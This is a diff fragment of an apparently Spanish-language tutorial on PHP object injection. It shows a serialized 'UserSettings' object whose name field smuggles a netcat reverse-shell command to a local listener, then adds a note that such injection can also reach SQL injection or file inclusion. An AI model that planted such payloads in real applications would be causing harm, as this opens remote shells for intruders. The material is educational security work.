@@ -55,3 +55,9 @@ Podríamos entonces modificar el value del name del objeto para crear una shell 
 ##### Objeto modificado con inyección de codigo:
 
        O:24:"App\Helpers\UserSettings":4:{s:30:"App\Helpers\UserSettingsName";s:6:"; nc -nv 127.0.0.1 9999 -e /bin/bash;#";s:31:"App\Helpers\UserSettingsEmail";s:17:"porota@porota.com";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$rhsxRw1X8gpBNhIaMVK9g.jREhfEqNWrNpIGxTpLry1nn8vp8YGXC";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}
+
+
+---
+#### Extra
+
+Nos siempre el RCE va a ser posible, de igual manera depende de los magic methods usados por los desarrolladores y la inyección en un objeto serializado no se resume a comandos. Puede ser aplicados a sql, LFI y cualquier otra transacción de datos. Sean creativos.
